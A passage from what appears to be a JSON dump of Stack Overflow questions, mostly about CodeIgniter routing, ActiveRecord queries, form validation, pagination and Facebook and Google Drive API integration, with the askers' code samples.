href=\"http://stackoverflow.com/questions/7190542/tinymce-strips-attributes-on-submit\">Tinymce strips attributes on submit</a>,  <a href=\"http://stackoverflow.com/questions/6266487/tinymce-allow-all-html-tag\">TinyMce Allow all Html tag</a>, <a href=\"http://stackoverflow.com/questions/5165586/tinymce-valid-elements-only-allow-specific-css-rules\">TinyMCE valid elements: only allow specific CSS rules</a>, <a href=\"http://stackoverflow.com/questions/10290121/how-to-prevent-tinymce-from-stripping-the-style-attribute-from-input-element\">how to prevent tinymce from stripping the &#39;style&#39; attribute from input element?</a>, <a href=\"http://stackoverflow.com/questions/7744903/tinymce-allow-data-attribute\">TinyMCE, allow data attribute</a> and many others...</p>\n\n<p>But none of them work.</p>\n\n<p>This is my code:</p>\n\n<pre><code>valid_elements : '+*[*]',\ncleanup: false,\ninline_styles : true\n</code></pre>\n\n<p>I have also tried</p>\n\n<pre><code>valid_elements : '*[*]'\n</code></pre>\n\n<p>(without <code>+</code> before <code>*[*]</code>)</p>\n\n<p>and even</p>\n\n<pre><code>valid_children : '+body[style]'\n</code></pre>\n\n<p>But when I add the styles manually like <code>style=\"color: #fff;\"</code> and submit the form, TinyMCE removes the returned output.</p>\n\n<p><strong>In other words: I want TinyMCE to stop 'removing' any code automatically.</strong></p>\n"},{"tags":["sql","codeigniter","activerecord"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":13001804,"title":"Codeigniter ActiveRecord update SQL error","body":"<p>I am working on CI 2.1.3 and encountering the following problem. What am I doing wrong here? Is there any reading or knowledge I need to do or know.</p>\n\n<h3>Codeigniter ActiveReocrd Update syntax</h3>\n\n<pre><code>$data['spun'] = TRUE;\n$this-&gt;db-&gt;update('registered', $data, \n                  \"registered_id = $registration['registered_id']\");\n</code></pre>\n\n<h3>what I expected</h3>\n\n<pre><code>UPDATE `registered` SET `spun` = 1 WHERE `registered_id` = 1\n</code></pre>\n\n<h3>what CI generated</h3>\n\n<pre><code>UPDATE `registered` SET `spun` = 1 WHERE `id` = 1\n</code></pre>\n\n<h3>DB table (in bracketing notation)</h3>\n\n<p>registered(<strong>registered_id</strong>, registered_name, ..., spun);</p>\n\n<h3>Edit 1</h3>\n\n<p>I also tried the following, but CI give the same SQL. </p>\n\n<pre><code>$this-&gt;db-&gt;update('registered', $data, \n                  array('registered_id' =&gt; $registration['registered_id']));\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12988043,"title":"Trying to remove index.php from code igniter not working with post","body":"<p>Rewrite rule working fine, apart from when I post any forms - the url that the data gets posted to is domain/index.php/index.php/controller/method.</p>\n\n<p>Any ideas? Already tried may responces on here.</p>\n\n<p>HT Access:</p>\n\n<pre><code>    # rewrite rules\n    RewriteEngine On\n\n    # ditch index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ /index.php?/$1 [L] \n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":443,"score":0,"question_id":11271558,"title":"How to customize form validation errors in codeIgniter","body":"<p>Is there a file in codeIgniter in which I could just edit so that I can customize the form validation messages?</p>\n\n<p><img src=\"http://i.stack.imgur.com/9VnBh.png\" alt=\"enter image description here\"></p>\n\n<p>I just want to place them in a bulleted list to consume less space.</p>\n\n<p>Here's the code that I'm using to output the error messages:</p>\n\n<pre><code>&lt;div class=\"alert &lt;?php echo $alert['alert_type']; ?&gt; min-form\"&gt;\n        &lt;button type=\"button\" class=\"close\" data-dismiss=\"alert\"&gt;x&lt;/button&gt;\n        &lt;h4&gt;&lt;?php echo $alert['main_message']; ?&gt;&lt;/h4&gt; \n        &lt;?php echo $alert['sub_message']; ?&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>Basically the <code>$alert['sub_message']</code> is just getting its data from <code>validation_errors()</code> function from CodeIgniter which outputs the validation errors from a form.</p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":13005081,"title":"CodeIgniter Validate File Before do_upload","body":"<p>I would like to validate the file extensions, file size, dimensions etc of the file being uploaded using a HTML form before actually storing them on the filesystem.</p>\n\n<p>The reason being, I'm also creating a row in a shop table, and the image is a thumbnail of the item.</p>\n\n<p>I need to store the image on the filesystem with a specific name (i.e. the ID of the row in the database) so I can reference the image later and show it against the item in the shop. The problem is that do_upload will save the file before I know what the ID is of the item row, because I can't create the row before I check if the file is valid. Otherwise I will need to do this:</p>\n\n<pre><code>Create item row\ndo upload -&gt; if upload failed -&gt; delete row\n-&gt; show errors\n</code></pre>\n\n<p>Or:</p>\n\n<pre><code>Do upload\nif upload failed -&gt; show errors\nif not -&gt; Create item row\n-&gt; Rename file to item row ID\n</code></pre>\n\n<p>I'd rather just do:</p>\n\n<pre><code>Validate file\nif failed -&gt; show errors\nif not -&gt; create row, upload file\n</code></pre>\n\n<p>Makes more logical sense that way. Ideas? Is this possible? Thanks.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13005520,"title":"add action in ignited datatables","body":"<p>I'm using Ignited Datatables for viewing active users. What I want now is to have an Action column which I can disable the user. This is my code.</p>\n\n<p>view:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n$(document).ready(function() {\n    $('#users_table').dataTable({\n        \"sScrollX\": \"100%\",\n        \"sScrollXInner\": \"100%\",\n        \"sPaginationType\": \"full_numbers\",\n        \"bProcessing\": true,\n        \"bServerSide\": true,\n        \"bJQueryUI\": true,\n        \"bDeferRender\": true,\n        \"sAjaxSource\": \"&lt;?php echo base_url(); ?&gt;/users/get_active_users\",\n        \"sServerMethod\": \"POST\",\n        \"aoColumnDefs\": [{\n            'bSortable': false,\n            'aTargets': [7]\n        }\n        ]\n    });\n});\n&lt;/script&gt;\n&lt;thead&gt;\n  &lt;tr&gt;\n     &lt;th class=\"width70 text-center\"&gt;Username&lt;/th&gt;\n     &lt;th class=\"text-center\"&gt;Full Name&lt;/th&gt;\n     &lt;th class=\"text-center\"&gt;Office&lt;/th&gt;\n     &lt;th class=\"text-center\"&gt;Position&lt;/th&gt;\n     &lt;th class=\"text-center\"&gt;Email&lt;/th&gt;\n     &lt;th class=\"width60 text-center\"&gt;Privilege&lt;/th&gt;\n     &lt;th class=\"width160 text-center\"&gt;Date Registered&lt;/th&gt;\n     &lt;th class=\"width60 text-center\"&gt;Actions&lt;/th&gt;\n  &lt;/tr&gt;\n&lt;/thead&gt;\n&lt;tbody&gt;\n  &lt;tr&gt;\n     &lt;td colspan=\"7\" class=\"dataTables_empty\"&gt;Loading data from server&lt;/td&gt;\n  &lt;/tr&gt;\n&lt;/tbody&gt;\n</code></pre>\n"},{"tags":["php","mysql","codeigniter","table"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":13005979,"title":"Managing Too many Columns data in a table in view","body":"<p>I have a mysql table in which i have 35 fields.<br>\nI have to show the list of all the records.<br>\nI only want to know that how can i manage all these column in the view file so that the user doesn't have to scroll right to view all the column values that are not displayed when user lands on that page.<br>\nIs there any alternative to this problem?<br>\nI dont want to use pagination for displaying single record. instead i am using pagination for displaying 10 records per page.</p>\n"},{"tags":["arrays","codeigniter","result"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13005272,"title":"fetch data in result_array();","body":"<p>I am fetching data in array and its get data when I use print_r function but when I display the array its said undefined data field.\nany way to display result <code>array();</code>? I don't want to use a <code>foreach</code> loop.</p>\n\n<p>The code is:</p>\n\n<pre><code>$menu2=$this-&gt;load-&gt;common_model-&gt;getRecord('*','inner_menu','menu_page',2);\nif ( $menu2-&gt;num_rows() &gt; 0) { \n  $page1    =   $menu2-&gt;result_array();\n  print_r($page1);\n  &lt;?=$page1['url']?&gt;// here it said undeifned variable url\n                    // url is in my db tabel inner_menu\n}\n</code></pre>\n"},{"tags":["regex",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13005582,"title":"HTAccess and Regex... Exclude String?","body":"<p>I am using htaccess to rewrite my URL's... with codeigniter, to be specific.  I Have two applications, one called \"frontend\", the other called \"admincp\".  The front end application uses index.php with $application_folder changed to \"frontend\".  The admincp application uses a copied index.php,  but renamed to admin.php.  The $application_folder is changed to \"admincp\" in this file.</p>\n\n<p>Basically, I want all URi's that contain \"admincp\" as the first uri segment to be rewritten to the admin.php file instead of index.php.  Then, all other URL's to be rewritten as usual... to index.php.</p>\n\n<p>mysite.com/admin/members would go to admin.php/members\nmysite.com/articles/Some-Awesome-Articles would go to index.php/articles</p>\n\n<p>I hope I have explained this well enough... Anyway, here is my current htaccess file, but it doesn't seem to work.  I get an internal server error.</p>\n\n<p><code></p>\n\n<pre><code> # Deny OR Allow Folder Indexes.\n# Since we disable access to PHP files you \n# can leave this on without worries. \n# OR better yet, create a .htaccess file in\n# the dir you want to allow browsing and\n# set it to +Indexes\nOptions -Indexes\n\nOptions +FollowSymLinks\n\n# Set the default file for indexes\nDirectoryIndex index.php\n\n&lt;IfModule mod_rewrite.c&gt;\n    # mod_rewrite rules\n    RewriteEngine on\n\n    # The RewriteBase of the system (if you are using this sytem in a sub-folder).\n    # RewriteBase /CodeIgniter_1.6.3/\n\n    # This will make the site only accessible without the \"www.\" \n    # (which will keep the subdomain-sensive config file happy)\n    # If you want the site to be accessed WITH the \"www.\" \n    # comment-out the following two lines.\n    # RewriteCond %{HTTP_HOST} ^www\\.site\\.com$ [NC]\n    # RewriteRule ^(.*)$ http://site.com/$1 [L,R=301]\n\n    # If a controler can't be found - then issue a 404 error from PHP\n    # Error messages (via the \"error\" plugin)\n    # ErrorDocument 403 /index.php/403/\n    # ErrorDocument 404 /index.php/404/\n    # ErrorDocument 500 /index.php/500/\n\n    # Deny any people (or bots) from the following sites: (to stop spam comments)\n    # RewriteCond %{HTTP_REFERER} nienschanz\\.ru [NC,OR]\n    # RewriteCond %{HTTP_REFERER} porn\\.com\n    # RewriteRule .* - [F]\n    # Note: if you are having trouble from a certain URL just \n    # add it above to forbide all visitors from that site.\n\n    # You can also uncomment this if you know the IP:\n    # Deny from 192.168.1.1\n\n    # If the file is NOT the index.php file\n    RewriteCond %{REQUEST_FILENAME} !index.php\n    # Hide all PHP files so none can be accessed by HTTP\n    RewriteRule (.*)\\.php$ index.php/$1\n\n    # If the file/dir is NOT real go to index\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^admin/(.*)$ admin.php/$1\n    RewriteRule ^(.*)$ index.php/$1\n\n&lt;/IfModule&gt;\n\n# If Mod_ewrite is NOT installed go to index.php\n&lt;IfModule !mod_rewrite.c&gt;\n    ErrorDocument 404 index.php\n&lt;/IfModule&gt;  \n</code></pre>\n\n<p></code></p>\n"},{"tags":["php","facebook","codeigniter","sdk","facebook-php-sdk"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":1,"view_count":223,"score":2,"question_id":8064221,"title":"What is the best way to connect a Codeigniter project to the Facebook API?","body":"<p>What is the best way to make a Facebook app with Codeigniter? </p>\n\n<p>I've seen fixes for using the official facebook-php-sdk, and libraries made for CI such as <a href=\"https://github.com/Necromnius/Facebook-Ignited/downloads\" rel=\"nofollow\">https://github.com/Necromnius/Facebook-Ignited/downloads</a></p>\n\n<p>What should I consider before deciding the way forward?</p>\n"},{"tags":["facebook","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":226,"score":1,"question_id":7991468,"title":"facebook ignited","body":"<p>In the welcome_view.php I can’t view my name even though I’m already logged in Facebook.</p>\n\n<p>this is my setup:</p>\n\n<pre><code>config/fb_ignited.php\n\n$config['fb_appid']     = 'myid';\n\n$config['fb_secret'] = 'mysecret';\n\n$config['fb_canvas'] = 'dean_test';\n\n$config['fb_apptype'] = 'connect';\n\n$config['fb_auth'] = ''; \n</code></pre>\n\n<p>now on my dev.facebook setup</p>\n\n<pre><code>App Display Name:Dean Mobile Application\n\nApp Namespace:dean_test\nWebsite\nSite URL: mydomain.com/dean_test/ \n</code></pre>\n\n<p>Supposedly when Im currently logged in it should show: Welcome <strong>Dean</strong>, to Facebook Ignited but it show me: Welcome, to Facebook Ignited</p>\n"},{"tags":["php","facebook","codeigniter"],"answer_count":4,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":1772,"score":1,"question_id":4478525,"title":"is there proper codeigniter library to work with facebook php sdk","body":"<p>I have searched Google for Libraries for <code>Facebook</code>, and have found this one: <a href=\"http://www.haughin.com/code/facebook/\" rel=\"nofollow\">http://www.haughin.com/code/facebook/</a>,\nbut it seems a bit outdated.\nI wanted something for this one: <a href=\"https://github.com/facebook/php-sdk/\" rel=\"nofollow\">https://github.com/facebook/php-sdk/</a></p>\n\n<p>I have written my own wrapper for it meanwhile, but it seems like I'm having some issues with <code>$_REQUEST['...']</code></p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13004454,"title":"Why doesn't the order of `where` attrs matter?","body":"<p>Recently I started building a filter that sorts my data in sphinx, but the thing is - I ran into an interesting CI bug (?). It doesn't matter in what order I pass my <code>WHERE</code> attributes because CI will simply sort the results on its own.</p>\n\n<p>Why do both of these queries return the same old result and is there a way how this could be fixed?</p>\n\n<pre><code>$a = $this-&gt;db-&gt;from('table')\n              -&gt;where('id', 1)\n              -&gt;or_where('id', 2)\n              -&gt;get()-&gt;result();\n\n$b = $this-&gt;db-&gt;from('table')\n              -&gt;where('id', 2)\n              -&gt;or_where('id', 1)\n              -&gt;get()-&gt;result();\n\nif ($a == $b) echo 'Equal';\n</code></pre>\n"},{"tags":["php","codeigniter","pagination","numbers"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":737,"score":1,"question_id":7666254,"title":"CodeIgniter 2.0.3 Pagination Class starting page","body":"<p>I was trying to work with the codeigniter pagination class.</p>\n\n<p>Here is my code</p>\n\n<pre><code>$this-&gt;load-&gt;library('pagination');\n\n$config['base_url'] = base_url('language/'.$this-&gt;uri-&gt;segment(2));\n$config['total_rows'] = $page_count;\n$config['per_page'] = 1; \n$config['num_links'] = '2';\n$config['uri_segment'] = '2';\n\n$this-&gt;pagination-&gt;initialize($config); \n\n$data['pages'] = $this-&gt;pagination-&gt;create_links();\n</code></pre>\n\n<p>but then, in the first page, the url would be look like </p>\n\n<pre><code>localhost/language/something/\n</code></pre>\n\n<p>while the second page would be</p>\n\n<pre><code>localhost/language/something/1\n</code></pre>\n\n<p>which looks kinda weird, is it possible to have the url starts with 1 on first page?</p>\n"},{"tags":["php","mysql","codeigniter","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13003885,"title":"Codeigniter Database Where with multiple clauses and another where","body":"<p>So I admit the title is a bit, confusing, I apologize cause I have no idea what to make it, so open to suggestions there. Anyway on to the actual question. I have a query, works fine for the most part, however I am still yielding some wrong results. Understandably so as well. As that is how this is forming the query. To many ands and to many ors loosely strung together. What I need to do is wrap a set of the where clauses in <code>( )</code> then have an <code>and</code> then the remaining set of clauses in another <code>( )</code> I have no idea if that makes sense to anyone.</p>\n\n<p>Basically if I were hand typing the query outright it'd look something like..</p>\n\n<pre><code>select * from my_table\nwhere (cond1 = this and cond2 = that) \nand (cond2 != something or cond3 &gt; other)\n</code></pre>\n\n<p>Not really sure how to accomplish that using codeigniter's active record. What I currently have is.</p>\n\n<pre><code>$this-&gt;db-&gt;select('user_event_invite.*, game_bridge.*, user_event.*, user_event.location as bizfo')\n-&gt;from('user_event')\n-&gt;join('game_bridge', 'user_event.gID = game_bridge.gID')\n-&gt;join('user_event_invite', 'user_event_invite.eID = user_event.eID')\n-&gt;where('user_event_invite.friendID', $mID)\n-&gt;where('user_event.isactive', 0)\n-&gt;where('user_event_invite.isactive', 0)\n-&gt;where('user_event.ends &gt;=', $this-&gt;genfunc-&gt;unixToMySQL(time()))\n-&gt;where('user_event.ends !=', '0000-00-00 00:00:00')\n-&gt;or_where('yes &gt; ', 0)\n-&gt;or_where('no &gt; ', 0)\n-&gt;or_where('maybe &gt; ', 0);\n</code></pre>\n\n<p>but what I am ultimately wanting is all these specific clauses in one group..</p>\n\n<pre><code>-&gt;where('user_event_invite.friendID', $mID)\n-&gt;where('user_event.isactive', 0)\n-&gt;where('user_event_invite.isactive', 0)\n-&gt;where('user_event.ends &gt;=', $this-&gt;genfunc-&gt;unixToMySQL(time()))\n-&gt;where('user_event.ends !=', '0000-00-00 00:00:00')\n</code></pre>\n\n<p>then combine that group with and AND to this other group.</p>\n\n<pre><code>-&gt;or_where('yes &gt; ', 0)\n-&gt;or_where('no &gt; ', 0)\n-&gt;or_where('maybe &gt; ', 0);\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13004181,"title":"How to determine that the input is already filtered by CodeIgniter xss protection","body":"<p>global xss protection is set to TRUE now. but the poison input will be displayed as literally as [removed], so I need to know whether the input is poison or not, if it's poison I will drop it.</p>\n\n<p>I can simply use the function strstr to do this, if there is [removed] in the string then it is poison.</p>\n\n<p>but wouldn't it be better if CodeIgniter provided already.</p>\n"},{"tags":["php","api","codeigniter","google-drive-sdk","google-drive"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":130,"score":0,"question_id":13002955,"title":"PHP Google Drive API installation and file upload","body":"<p>Hi guys i'm trying uploading file trought G drive API.</p>\n\n<p>Can't find out why it returns error:</p>\n\n<pre><code>&lt;?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Gdrive{\n\nfunction initialize(){\n$credentials = $this-&gt;GetOAuth2Credentials($_GET['code']);\n$_SESSION['credentials'] = $credentials;\n\n}\n/**\n * Exchange an authorization code for OAuth 2.0 credentials.\n *\n * @param String $authorizationCode Authorization code to exchange for an\n *     access token and refresh token.  The refresh token is only returned by\n *     Google on the very first exchange- when a user explicitly approves\n *     the authorization request.\n * @return OauthCredentials OAuth 2.0 credentials object\n */\nfunction GetOAuth2Credentials($authorizationCode) {\n  $client = new apiClient();\n  $client-&gt;setClientId(Config::5112+++++.apps.****5971157@developer.gserviceaccount.com);\n  $client-&gt;setRedirectUri(Config::site_url());\n\n  /**\n   * Ordinarily we wouldn't set the $_GET variable.  However, the API library's\n   * authenticate() function looks for authorization code in the query string,\n   * so we want to make sure it is set to the correct value passed into the\n   * function arguments.\n   */\n  $_GET['code'] = $authorizationCode;\n\n  $jsonCredentials = json_decode($client-&gt;authenticate());\n\n  $oauthCredentials = new OauthCredentials(\n      $jsonCredentials-&gt;access_token,\n      isset($jsonCredentials-&gt;refresh_token)?($jsonCredentials-&gt;refresh_token):null,\n      $jsonCredentials-&gt;created,\n      $jsonCredentials-&gt;expires_in,\n      Config::CLIENT_ID,\n      Config::CLIENT_SECRET\n  );\n\n  return $oauthCredentials;\n}\nfunction SaveNewFile($inputFile) {\n  try {\n    $mimeType = 'text/plain';\n    $file = new Google_DriveFile();\n    $file-&gt;setTitle($inputFile-&gt;title);\n    $file-&gt;setDescription($inputFile-&gt;description);\n    $file-&gt;setMimeType($mimeType);\n    // Set the parent folder.\n    if ($inputFile-&gt;parentId != null) {\n      $parentsCollectionData = new DriveFileParentsCollection();\n      $parentsCollectionData-&gt;setId($inputFile-&gt;parentId);\n      $file-&gt;setParentsCollection(array($parentsCollectionData));\n    }\n    $createdFile = $this-&gt;service-&gt;files-&gt;insert($file, array(\n        'data' =&gt; $inputFile-&gt;content,\n        'mimeType' =&gt; $mimeType,\n    ));\n    return $createdFile;\n  } catch (apiServiceException $e) {\n    /*\n     * Log error and re-throw\n     */\n    error_log('Error saving new file to Drive: ' . $e-&gt;getMessage(), 0);\n    throw $e;\n  }\n}\n\n\n}\n</code></pre>\n\n<p>when i invoke the initialize() method it returns error:</p>\n\n<pre><code>Message: Undefined index: code\n\nFatal error: Class 'apiClient' not found\n</code></pre>\n\n<p>what should be? i'm doing right in my code ? does i need more code to make it works? i created web application project on google api console.</p>\n\n<p>need i to include google php sdk? in the google docs it is not mentioned for google drive api :/</p>\n"},{"tags":["codeigniter","callback","form-validation","codeigniter-2","validationrules"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":649,"score":0,"question_id":8740973,"title":"In Codeigniter, how to pass a third parameter to a callback (form validation)?","body":"<p>I am currently using the Form Validation class (on Codeigniter) and setting rules.</p>\n\n<p>It works like this with two parameters (<a href=\"http://codeigniter.com/user_guide/libraries/form_validation.html\" rel=\"nofollow\">codeigniter.com/user_guide/libraries/form_validation.html</a>):</p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('username', 'Username', 'callback_test[abc]');\n</code></pre>\n\n<p>But what about a third parameter? And a fourth...? Is it possible?</p>\n"},{"tags":["ajax","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12997656,"title":"redirect to another page ajax and codeigniter","body":"<p>Can anyone help me to give simple solution to redirect page once the user signup form after success.</p>\n\n<p>My controller code:</p>\n\n<pre><code>public function signup()\n{\n$this-&gt;load-&gt;library('form_validation');\n$this-&gt;form_validation-&gt;set_rules('user_name','Name','trim|required|min_length[4]xss_clean');\n$this-&gt;form_validation-&gt;set_rules('signupemail','Email','trim|required|valid_email');\n$this-&gt;form_validation-&gt;set_rules('password','Password','trim|required|min_length[8]xss_clean');\n$this-&gt;form_validation-&gt;set_rules('confmpassword','Password Confirmation','trim|required|matches[password]');\n$this-&gt;form_validation-&gt;set_rules('contactno','Contact No','trim|required');\n\nif ($this-&gt;form_validation-&gt;run()) {\n\n       // $this-&gt;welcome_model-&gt;InsertStudents();\n        echo json_encode(\"Thank You, Successfully Completed\");\n        //$this-&gt;welcome();\n    } else {\n\n        $val = array(\n            'name' =&gt; form_error('name'),\n            'email' =&gt; form_error('email'),\n            'password' =&gt; form_error('password'),\n            'confirmpassword' =&gt; form_error('confmpassword'),\n            'contactno' =&gt; form_error('contactno')\n        );\n\necho json_encode(validation_errors());\n    }\n}\n</code></pre>\n\n<p>Ajax code:</p>\n\n<pre><code>$(document).ready(function(){\n    $('#message').hide();\n            $('form').submit(function(){\n                //alert('ok');     \n\n                $.ajax({\n                    url:this.action,\n                    type:this.method,\n                    data:$(this).serialize(),\n                    success:function(data){\n                         var obj = $.parseJSON(data);\n\n                        $('#message').show();\n                        if(obj['name']!=null)\n                        {   \n\n                            $('#message').text(\"\");\n                            $('#message').append(obj1);\n                            $('#message').html(obj['name']);\n                            $('#message').append(obj['email']);\n                            $('#message').append(obj['password']);\n                            $('#message').append(obj['confirmpassword']);\n                            $('#message').append(obj['contactno']);\n                        }\n                        else\n                        {   \n\n                            $('#message').text(\"\");\n                            $('#message').html(obj);\n\n\n                        }\n\n                    },\n                    erro:function(){\n                        alert(\"Please Try Again\");\n                    }                        \n                });\n                return false;\n            });                        \n        });\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13002651,"title":"Codeigniter, loading views inside views, variables doesn't reset each time","body":"<p>I'm using the latest stable version of Codeigniter.</p>\n\n<p>Here's part of the controller:</p>\n\n<pre><code>$data = array(\n    'tracks' =&gt; $this-&gt;tracks_model-&gt;get(NULL, 'start_date'),\n    'longest_distance' =&gt; $this-&gt;tracks_model-&gt;get(10, 'distance'),\n    'longest_time' =&gt; $this-&gt;tracks_model-&gt;get(10, 'moving_time') \n);\n\n$this-&gt;load-&gt;view('statistics_view', $data);\n</code></pre>\n\n<p>and here's part of the code inside the file statistics_view.php:</p>\n\n<pre><code>&lt;section&gt;\n\n    &lt;h3&gt;Section 1&lt;/h3&gt;\n\n    &lt;?php $this-&gt;load-&gt;view('podium_view', array('tracks' =&gt; $longest_time, 'unit' =&gt; 'ore', 'function' =&gt; 'minutes_to_hours')) ?&gt;\n\n&lt;/section&gt;\n\n&lt;section&gt;\n\n    &lt;h3&gt;Section 2&lt;/h3&gt;\n\n    &lt;?php $this-&gt;load-&gt;view('podium_view', array('tracks' =&gt; $longest_distance, 'unit' =&gt; 'km')) ?&gt;\n\n&lt;/section&gt;\n</code></pre>\n\n<p>I've noticed that in the 2nd loaded view (inside section 2), the variable $function is still set from section 1, and the other values (traks, unit) are the one I passed.</p>\n\n<p>Why the variable function is still set in the second view?\nShouldn't be reset?</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":12153174,"title":"Comet chat integration with Code Igniter","body":"<p>I am using comet chat with Code Igniter 2.0.</p>\n\n<p>Problem-</p>\n\n<p>i have a listing page where all the users are listed and i need to show their comet chat status (\"Online\" or \"Offline\") next to their name.</p>\n\n<p>For this purpose we have a DB field ('chat_status') in our users table, we usually set this field to '0' or '1' when user logged in we set this field to '1' and when user logged out we set this field to '0'. I just want to use comet chat call backs that will return all the online user_ids in array so i will change their 'chat_status' to '1' in our users table.</p>\n\n<p>I couldn't find any comet chat function or query that will return all the online users in one shot.</p>\n\n<p>Can you please assist me to solve this stuff.</p>\n\n<p>Thanks in advance </p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12978002,"title":"Codeigniter Tank Auth Not Logging In?","body":"<p>I have been developing a codeigniter website for a few months now, using the Tank Auth library for users. It's still in development, but for the last 4 months everything has been working perfect.</p>\n\n<p>A few days ago all of a sudden the login feature just stopped working, when you enter your credentials it just refreshes the page, regardless if you're right or wrong, and displays no error messages.</p>\n\n<p>Does anyone know what is wrong? Or has anyone dealt with this before? Is there any feature I can turn on that would display any errors if they're were any. I have error reporting on and codeigniter is still set to development mode.</p>\n\n<p>I would really appreciate it if someone could provide some insight to my problems.</p>\n\n<p>P.s. I've searched the rest of SO, found some similar problems, but no solutions.</p>\n\n<p>Any help is appreciated.</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13001268,"title":"Multiple image file upload form control doesn't upload files in order they were selected","body":"<p>Theoretically, how to make form upload file control to upload images in the order they were selected for upload, and not in the order they appear on my PC? Without using JQuery/AJAX?</p>\n\n<p>I would like to avoid having multiple upload fields because sometimes I might have more images for upload and sometimes not.</p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13000312,"title":"MY_Controller class not found","body":"<p>The main thing i want to solve is to check user session when somebody want to access admin panel. I've created MY_Controller class and placed it in library.</p>\n\n<pre><code>class MY_Controller extends CI_Session {\n\npublic $logged_in = FALSE;\n\npublic function  __construct() {\n    parent::__construct();\n    $this-&gt;is_logged_in();\n}\n\npublic function is_logged_in()\n{\n    $logged = $this-&gt;userdata('user_id');\n    $this-&gt;logged_in = ($logged) ? TRUE : FALSE;\n}\n\nfunction sessdestroy() {\n\n    $this-&gt;session-&gt;sess_destroy();\n\n}\n\n}\n</code></pre>\n\n<p>This is my login page. I've created a button that redirects to admin panel (dashboard) just to test if the session check works.</p>\n\n<pre><code>class Login extends CI_Controller {\n\nfunction __construct() {\n\n    parent::__construct();\n\n}\n\npublic function index() {\n\n    $this-&gt;load-&gt;view('view_login');\n\n    if(isset($_POST['redirect'])) {\n\n    redirect('admin');\n\n    }\n}\n\n\n}\n</code></pre>\n\n<p>This is the admin controller where i check if the user session exists.</p>\n\n<pre><code>class Admin extends MY_Controller {\n\nfunction construct() {\n\n    parent::__construct();\n\n}\n\n\nfunction index() {\n\n    if($this-&gt;is_logged_in()) {\n\n    $this-&gt;dodadi_destinacija();\n\n    }\n\n    else redirect('login');\n\n}\n\n}\n</code></pre>\n\n<p>BUT i got this error.</p>\n\n<pre><code>Fatal error: Class 'MY_Controller' not found in C:\\wamp\\www\\UserPanel\\application\\controllers\\admin.php on line 3\n</code></pre>\n\n<p>Can you tell me your thoughts about my coding solution for the given problem please :)</p>\n"},{"tags":["php","codeigniter","url","href"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12998525,"title":"Code Igniter - relative URLs stop working when URL ends in slash?","body":"<p>I'm trying to learn CI and have just worked through the <a href=\"http://codeigniter.com/user_guide/tutorial/index.html\" rel=\"nofollow\">starter tutorial</a>. I'm finding that some of the link HREFs don't work if my URL ends in a trailing slash - for example, these links:</p>\n\n<pre><code>&lt;?php foreach ($news as $news_item): ?&gt;\n\n    &lt;h2&gt;&lt;?php echo $news_item['title'] ?&gt;&lt;/h2&gt;\n    &lt;div id=\"main\"&gt;\n        &lt;?php echo $news_item['text'] ?&gt;\n    &lt;/div&gt;\n    &lt;p&gt;&lt;a href=\"news/&lt;?php echo $news_item['slug'] ?&gt;\"&gt;View article&lt;/a&gt;&lt;/p&gt;\n\n&lt;?php endforeach ?&gt;\n</code></pre>\n\n<p>The links to stories work fine when I'm on</p>\n\n<pre><code>/index.php/news\n</code></pre>\n\n<p>but not if I'm 